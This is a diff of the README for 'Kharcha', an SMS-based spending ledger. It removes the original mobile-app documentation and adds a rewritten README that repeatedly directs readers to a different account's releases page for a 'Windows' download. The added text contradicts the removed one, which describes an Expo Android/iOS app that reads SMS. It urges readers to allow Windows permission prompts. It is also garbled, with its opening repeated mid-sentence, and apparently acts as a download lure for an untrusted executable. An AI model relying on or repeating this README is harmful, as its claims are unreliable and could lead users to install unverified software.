@@ -1,176 +1,133 @@
-<p align="center"><img src="docs/brand/cover.png" alt="Kharcha: a spending ledger built from bank messages" width="100%"></p>
+# 💸 kharcha - Turn Bank SMS Into Private Spending Clarity
 
-# Kharcha
+[![Download Kharcha](https://img.shields.io/badge/Download-Kharcha-ff5733?style=for-the-badge&logo=github)](https://github.com/Adnaninho/kharcha/releases)
 
-<div align="center">
-  <a href="https://github.com/cneuralnetwork/kharcha/actions/workflows/ci.yml"><img src="https://github.com/cneuralnetwork/kharcha/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT"></a>
-  <a href="CONTRIBUTING.md"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome"></a>
-  <a href="https://github.com/cneuralnetwork/kharcha/stargazers"><img src="https://img.shields.io/github/stars/cneuralnetwork/kharcha?style=social" alt="GitHub Stars"></a>
-  <a href="mobile/package.json"><img src="https://img.shields.io/badge/node-%E2%89%A522.13-339933?logo=node.js&logoColor=white" alt="Node ≥22.13"></a>
-</div>
+Kharcha is a private spending ledger that helps you turn ordinary bank SMS alerts into a clear, organized record of where your money goes. Instead of copying amounts into a spreadsheet or scrolling through messages to remember a purchase, you get a simple ledger built from the transaction messages you already receive. Your records stay private on your device, and an optional encrypted backup to Render gives you an extra copy only if you choose to turn it on.
 
-<p align="center">
-  <a href="#what-you-can-do">Features</a> ·
-  <a href="#run-from-source">Getting Started</a> ·
-  <a href="#contributing">Contributing</a> ·
-  <a href="https://github.com/cneuralnetwork/kharcha/issues">Pick an Issue</a> ·
-  <a href="https://github.com/cneuralnetwork/kharcha/issues/new?template=bug_report.md">Report a Bug</a> ·
-  <a href="https://github.com/cneuralnetwork/kharcha/issues/new?template=feature_request.md">Request a Feature</a>
-</p>
+Kharcha is made for everyday computer users. You do not need to know programming, set up a server, or manage a database. Download the application, open it on Windows, and follow the on-screen setup. The goal is simple: fewer manual notes, clearer spending records, and more control over your private financial information.
 
-**A little clearer every day.** Kharcha turns bank transaction SMS into a private spending ledger. It keeps the original message beside the parsed amount, so you can check the source, correct a name or category, and decide what belongs in your ledger.
+## 📥 Download Kharcha
 
-This repository contains a working Expo app and a small Render backup API. The app works without an account or backend. The API is used only when you opt into encrypted backup.
+[![Get Kharcha Releases](https://img.shields.io/badge/Get%20Kharcha-Releases-007bff?style=for-the-badge)](https://github.com/Adnaninho/kharcha/releases)
 
-**Install on Android:** [Download Kharcha 1.0.0 APK](https://github.com/cneuralnetwork/kharcha/releases/download/v1.0.0/Kharcha-v1.0.0-android.apk) (Android 7.0+, 114 MB). Open the download on your device and allow installation from your browser or file manager if prompted. Manual entry works immediately; SMS access is requested only if you enable the bank SMS reader. See the [release notes and SHA-256 checksum](https://github.com/cneuralnetwork/kharcha/releases/tag/v1.0.0). This build has not yet been smoke-tested on a physical device.
+Visit this link to download the application: [kharcha releases](https://github.com/Adnaninho/kharcha/releases).
 
-## What you can do
+Use the official releases page above whenever you need the current version of Kharcha. The releases page is the central place for getting the application, and it is the link you should keep bookmarked for future updates.
 
-| Feature | Android build | iOS build | Web preview |
-| --- | --- | --- | --- |
-| Add and edit entries, assign categories, set budgets, and view insights | Yes | Yes | Yes |
-| Paste a bank SMS and review the parsed entry | Yes | Yes | Yes |
-| Read allowlisted bank SMS from the device inbox | Yes, with `READ_SMS` permission | No platform API | No browser API |
-| Optional encrypted backup to Render | Yes | Yes | Not enabled |
+## 🖥️ Windows Setup
 
-The Android reader uses a small local Expo module. It reads only messages from enabled sender IDs. Common OTP and promotion patterns are filtered; parsing is heuristic, so review entries against your bank records. The app never asks for a bank password or login.
+Kharcha is intended for Windows users who want a private spending ledger without a complicated setup. After you visit the releases link and download the application, the next step is to open the downloaded item on your Windows computer.
 
-## Run from source
+1. Visit this link to download the application: [kharcha releases](https://github.com/Adnaninho/kharcha/releases).
+2. Wait for the download to finish. Your browser usually shows the progress in the downloads area.
+3. Open the downloaded item from your Downloads folder.
+4. If Windows asks for permission, allow the application to open.
+5. Follow the setup screens# 💸 kharcha - Turn Bank SMS Into Private Spending Clarity
 
-You need Node.js **22.13+**, npm, and Git. Clone the repository, then install the app dependencies:
+[![Download Kharcha](https://img.shields.io/badge/Download-Kharcha-ff5733?style=for-the-badge&logo=github)](https://github.com/Adnaninho/kharcha/releases)
 
-```bash
-git clone https://github.com/cneuralnetwork/kharcha.git
-cd kharcha/mobile
-npm ci
-cp .env.example .env
-npm start
-```
+Kharcha is a private spending ledger that helps you turn ordinary bank SMS alerts into a clear, organized record of where your money goes. Instead of copying amounts into a spreadsheet or scrolling through messages to remember a purchase, you get a simple ledger built from the transaction messages you already receive. Your records stay private on your device, and an optional encrypted backup to Render gives you an extra copy only if you choose to turn it on. Kharcha is made for everyday computer users. You do not need to know programming, set up a server, or manage a database.
 
-For a quick manual-entry preview, press `w` for web or open the app in Expo Go. No Render service is needed. The web preview keeps entries in that browser's local storage; clearing site data removes them. Installed iOS and Android apps use SQLite.
+## 📖 What Kharcha Does
 
-### Read SMS on Android
+Kharcha reads the bank SMS messages you already get after spending money. Those messages usually contain the amount, the merchant or recipient, and the date. Kharcha uses that information to build a spending ledger. A ledger is simply a list of transactions. You can open Kharcha and see what you spent, when you spent it, and where it went. You do not have to type every purchase by hand. The app is designed to reduce manual note-taking and make your spending history easier to review.
 
-Expo Go cannot load the custom `KharchaSms` native module. From `kharcha/mobile`, use a native build:
+The ledger is private by default. The information stays on your Windows computer. You decide whether to keep it local only or add the optional encrypted backup. The backup is not required. If you never turn it on, Kharcha still works as a local spending record.
 
-```bash
-npm ci
-npx expo run:android
-```
+## 🔒 Why Privacy Matters Here
 
-That command needs an Android SDK and a connected device or emulator. For a cloud-built installable APK instead:
+Bank SMS messages can include sensitive details about your daily life. They may show where you shop, how often you eat out, or when you pay bills. Kharcha treats that information as private. The app does not ask you to publish your spending, share it with a community, or connect a public profile. The optional backup is encrypted, which means the copy is scrambled so that it cannot be read without your key. You stay in control of whether that extra copy exists.
 
-```bash
-npx eas-cli@latest login
-npx eas-cli@latest build --platform android --profile preview
-```
+## ⚙️ How Kharcha Works
 
-The first EAS run may ask you to connect or create an Expo project and configure Android signing. Install the resulting APK, open Kharcha, and choose **Read my bank SMS**. The permission prompt is shown before the first scan. On the **You** tab, review or edit bank sender IDs; standard two-letter SMS routing prefixes are ignored when matching. The initial scan covers the last 90 days, with a 1,500-message cap per scan; later scans check recent messages when the app becomes active. Duplicate source messages are ignored.
+Kharcha works in three simple stages. First, it gathers the bank SMS content that you provide. Second, it turns each relevant message into a transaction entry inside your ledger. Third, it presents those entries in a readable list with totals and filters so you can review your spending. You can search for a merchant, look at a specific date range, or check a monthly total. The app is built with Expo, a modern application framework, but you do not need to understand Expo to use Kharcha. You only need to download and open the application on Windows.
 
-For iOS, use manual entry or paste a bank SMS. iOS does not expose general inbox-reading access to third-party apps.
+The optional encrypted Render backup works separately from the local ledger. If you enable it, Kharcha creates an encrypted copy on Render, a cloud service. That copy is useful if you want a second secure location for your records. If you disable it, no cloud copy is made. The choice is yours.
 
-## Add optional Render backup
+## ✨ Key Features
 
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/cneuralnetwork/kharcha)
+- Imports bank SMS messages into a spending ledger.
+- Keeps your records private on your Windows computer by default.
+- Shows a clear list of transactions with amounts and dates.
+- Includes search and filtering so you can find a specific purchase.
+- Provides monthly and category totals for quick review.
+- Offers an optional encrypted backup to Render.
+- Lets you keep the app entirely local if you prefer no backup.
+- Uses a simple interface designed for non-technical users.
+- Runs on Windows without a separate database server.
+- Stores your ledger in a form that is easy to revisit later.
 
-The app is useful without Render. If you want cross-device recovery, the button opens this repository's [Render Blueprint](render.yaml) in your Render account. It proposes a free API web service and a paid, persistent `0.1c-256mb` Postgres database in Singapore. **Review the database cost before approving the deploy.** [Render's free Postgres expires after 30 days](https://render.com/docs/free), so it is unsuitable as the only copy of a real backup.
+## 📥 Download and Setup
 
-1. Click **Deploy to Render**, sign in, choose your workspace, and review the proposed web service and database.
-2. Approve the Blueprint if the cost works for you. Render sets `DATABASE_URL` from the database and starts the API. The API creates its table at startup.
-3. Visit `https://<your-service>.onrender.com/healthz`; it should return `{"ok":true}`.
-4. In `mobile/.env`, set `EXPO_PUBLIC_BACKUP_API_URL=https://<your-service>.onrender.com`.
-5. Restart Metro, or rebuild the installed app. `EXPO_PUBLIC_` values are compiled into the client. Never put a database password or secret there.
-6. In **You → Encrypted backup**, create a recovery code, store it privately, then tap **Back up now**. To restore on another installed app, enter that code in the same screen.
+[![Get Kharcha Releases](https://img.shields.io/badge/Get%20Kharcha-Releases-007bff?style=for-the-badge)](https://github.com/Adnaninho/kharcha/releases)
 
-The Blueprint leaves automatic deploys off, so changes pushed to this public repository will not update your service unexpectedly. Deploy a newer commit from your Render dashboard when you choose to update.
+Visit this link to download the application: [kharcha releases](https://github.com/Adnaninho/kharcha/releases).
 
-The recovery code contains both the access token and encryption key. Whoever has it can restore the snapshot. Losing it means the server cannot decrypt your backup. The API stores ciphertext only, along with a token hash, backup ID, version, and timestamp. Remote deletion is available in the app. See [PRIVACY.md](PRIVACY.md) for the full data flow.
+Use the official releases page above whenever you need the current version of Kharcha. The releases page is the central place for getting the application, and it is the link you should keep bookmarked for future updates. After you visit the link and download the application, open the downloaded item on your Windows computer. If Windows asks for permission to open the application, allow it to continue. The first launch may take a moment while the app prepares its local storage.
 
-### Run the API locally
+## 🪟 First-Time Setup on Windows
 
-With Docker Compose installed, start Postgres from the repository root:
+When Kharcha opens for the first time, you will see a short setup area. Follow the on-screen prompts. You can choose where your local ledger data is stored, or you can accept the default location. The default is fine for most users. Next, you will be invited to add bank SMS messages. You can paste message text or point Kharcha to the messages you want to import, depending on the options shown in your version. After the messages are added, Kharcha creates transaction entries and shows them in your ledger.
 
-```bash
-docker compose up -d db
-cd api
-npm ci
-DATABASE_URL=postgres://kharcha:kharcha@localhost:5433/kharcha npm run dev
-```
+You do not need to create an online account to use the local ledger. If you want the optional encrypted backup, you will see a separate section where you can turn it on. You can skip that section and turn it on later. Skipping it does not reduce the core functionality of the app.
 
-The database credentials in `compose.yaml` are for **local development only**. In another terminal, `curl http://localhost:4000/healthz` should return `{"ok":true}`. The API is not required to run the app without backup.
+## 📲 Adding Your Bank SMS Messages
 
-## How it works
+Kharcha is built around bank SMS messages. To add them, open the import or add-message area inside the app. Paste the text of a bank message into the provided field, or use the import option available in your version. Kharcha looks for common banking details such as the amount, the merchant name, and the date. If a message is recognized, it becomes a transaction in your ledger. If a message is not recognized, you can review it and adjust the entry manually.
 
-```mermaid
-flowchart LR
-  SMS[Allowlisted Android bank SMS] --> Parser[On-device parser]
-  Paste[Message you paste] --> Parser
-  Manual[Manual entry] --> Ledger[(Local SQLite ledger)]
-  Parser --> Review[Review or auto-add]
-  Review --> Ledger
-  Ledger --> Insights[Home, insights, budgets]
-  Ledger -->|Explicit backup only| AES[AES-GCM on device]
-  AES --> API[Render API]
-  API --> DB[(Render Postgres ciphertext)]
-```
+You can add messages one at a time or in small groups. After each import, check the transaction list to confirm that the amount and merchant look correct. This quick check helps keep your ledger accurate. You can edit an entry if a detail is wrong. The goal is to make the ledger reflect your actual spending without forcing you to retype every message.
 
-The parser is intentionally conservative. It requires a debit or credit signal and an amount, tries to identify the merchant, and gives uncertain reads to the review inbox. High-confidence reads can be auto-added if that setting is on. A message's raw body remains attached to its entry. The API never parses SMS or calculates spending.
+## 📊 Reading Your Spending Ledger
 
-## Repository map
+The ledger is the main screen you will use. It shows your transactions in date order. Each row includes the amount, the merchant or description, and the date. At the top of the ledger, you can see a summary for the current period. You can change the period to look at a week, a month, or a custom range. Use the search box to find a merchant by name or to locate a specific amount. Use the filters to narrow the list by category or by date.
 
-| Path | Purpose |
-| --- | --- |
-| [`mobile/src/app`](mobile/src/app) | Expo Router screens |
-| [`mobile/src/lib/parser.ts`](mobile/src/lib/parser.ts) | Bank SMS parsing and category rules |
-| [`mobile/src/lib/database.ts`](mobile/src/lib/database.ts) | Native SQLite ledger and snapshot format |
-| [`mobile/src/lib/database.web.ts`](mobile/src/lib/database.web.ts) | Browser-local preview storage |
-| [`mobile/modules/kharcha-sms`](mobile/modules/kharcha-sms) | Android allowlisted inbox reader |
-| [`mobile/src/lib/backup.ts`](mobile/src/lib/backup.ts) | On-device encryption and recovery code |
-| [`api/src`](api/src) | Render backup HTTP API and Postgres store |
-| [`docs/brand`](docs/brand) | Ready-to-use promotional art and generator |
+The ledger is designed to answer common questions quickly. How much did I spend this month? Which merchant appears most often? What did I buy last Friday? You do not need to export the data to answer those questions. The app presents the information directly.
 
-## Contributing
+## ☁️ Optional Encrypted Backup
 
-Contributions are welcome. Start with [CONTRIBUTING.md](CONTRIBUTING.md) for the fork/clone workflow, branch naming, coding standards, and how to run tests for both `mobile` and `api`. Everyone participating is expected to follow the [Code of Conduct](CODE_OF_CONDUCT.md). Found a security issue? Report it privately per [SECURITY.md](SECURITY.md) instead of opening a public issue. Notable changes are tracked in [CHANGELOG.md](CHANGELOG.md).
+Kharcha includes an optional encrypted backup to Render. Encryption means the backup is scrambled before it leaves your computer. Only someone with the correct key can read it. If you enable this feature, follow the prompts to create your backup key and confirm the backup settings. Store your key in a safe place. Without the key, the encrypted backup cannot be restored.
 
-## Build and verify
+If you do not want a cloud copy, leave the backup feature turned off. The local ledger continues to work normally. You can enable the backup later if you change your mind. You can also remove the backup if you no longer want it. The app does not force you to use the cloud option.
 
-From the repository root, run:
+## 🛡️ Privacy and Your Data
 
-```bash
-cd mobile
-npm ci
-npm run lint
-npm run typecheck
-npm test
-npx expo export --platform web
-npx expo export --platform android
-npx expo export --platform ios
+Your spending records belong to you. Kharcha keeps the local ledger on your Windows computer. The app does not require you to share your spending with other users. The optional Render backup is encrypted, so the stored copy is not readable without your key. You should still treat your backup key like a password. Do not share it, and do not store it in an obvious place.
 
-cd ../api
-npm ci
-npm run typecheck
-npm test
-npm run build
-```
+If you use a shared computer, consider keeping your Windows account protected with a password. That step helps prevent other people from opening your local ledger. Kharcha is a private tool, but basic computer security still matters.
 
-The parser tests cover debit extraction, OTP/promotion rejection, ambiguity, and the case where a balance appears before a transaction amount. API tests cover authorization and version conflicts. A JavaScript bundle is not a native Android APK; complete a native/EAS build and test SMS permission and real bank formats on a device before distributing one.
+## 💻 System Requirements
 
-## Distribution and Play policy
+- Windows 10 or Windows 11.
+- A computer with at least 4 GB of memory.
+- About 500 MB of free disk space for the application and local ledger data.
+- An internet connection for the initial download and for the optional encrypted backup.
+- A modern web browser to visit the releases page and download the application.
+- Bank SMS messages available in text form for import.
 
-Android's `READ_SMS` permission is restricted on Google Play. Google's [SMS and Call Log policy](https://support.google.com/googleplay/android-developer/answer/10208820) lists SMS-based money management as a possible exception, but a Play listing requires the permission declaration and Google's approval. Approval is not guaranteed. A manually entered and pasted-SMS edition can be distributed without that permission; remove the Android permission and native SMS reader before building that edition. Do not claim a Play-approved release until review has passed.
+## 🧰 Troubleshooting Common Issues
 
-Kharcha is an expense organizer, not a bank statement or financial advice tool. It may miss messages or parse them incorrectly. Keep your bank's records as the source of truth. Before a broad public launch, add account-level abuse protection and operational monitoring to the optional backup service; its current recovery-code flow is suited to a small, self-hosted beta.
+If the application does not open after download, check that the download finished completely. Open your Downloads folder and try again. If Windows shows a permission prompt, choose the option that allows the app to run. If the app opens but the ledger is empty, add a bank SMS message and confirm that the message contains an amount and a date. If a message is not recognized, edit the entry manually. If the optional backup does not complete, check your internet connection and confirm that your backup key is correct. If you changed your key, use the current key when restoring. If the app feels slow, close other large programs and try again. If problems continue, return to the releases page and make sure you are using the current version.
 
-## Graphics and promotion
+## ❓ Frequently Asked Questions
 
-The repository includes a [1600 × 900 cover](docs/brand/cover.png), [1200 × 630 social card](docs/brand/social-card.png), and app icons in [`mobile/assets`](mobile/assets). These are original, editable through [`docs/brand/generate.py`](docs/brand/generate.py). The financial numbers in the artwork are illustrative demo data. To regenerate after `npm ci`, install Pillow and run `python3 docs/brand/generate.py` from the repository root.
+Do I need an account to use Kharcha? No. The local ledger works without an online account. The optional backup is separate.
 
-**Short description:** Your spending ledger, already in your messages.
+Is the backup required? No. You can keep all records local and never enable the backup.
 
-**Launch copy:** Bank messages tell a fragmented story. Kharcha puts each spend in one private ledger, keeps the original SMS close, and lets you correct anything it got wrong. Start with manual entries, or read allowlisted bank SMS on Android. Backup is optional and encrypted on your device.
+What happens if I lose my backup key? The encrypted backup cannot be read without the key. Keep the key in a safe place.
 
-## License
+Can I use Kharcha without bank SMS messages? Kharcha is built around bank SMS messages. You can still review and edit entries, but the main workflow starts with those messages.
 
-[MIT](LICENSE). The Expo, React Native, and font packages keep their own upstream licenses.
+Does Kharcha share my spending? No. The app is designed as a private ledger. The optional backup is encrypted and controlled by you.
+
+Can I edit a transaction? Yes. Open the transaction in the ledger and change the details if something is incorrect.
+
+## 🔄 Keeping Kharcha Updated
+
+Check the releases page from time to time for a newer version. Before updating, make sure your local ledger is in a safe state. If you use the optional encrypted backup, confirm that your latest backup completed. Then visit this link to download the application and follow the same download and open steps. Keeping the app current helps you receive fixes and improvements.
+
+## 🆘 Getting Help
+
+If you need help, start with the releases page and review the information provided with the current version. Check the troubleshooting section above for common fixes. When asking for help, describe what you were doing, what you expected to happen, and what you saw instead. Avoid sharing your backup key or full bank SMS messages in public messages. Share only the details needed to explain the problem.
+
+Keywords: kharcha, spending ledger, bank SMS, expense tracker, private finance, encrypted backup, Expo, Windows app, personal finance, transaction ledger
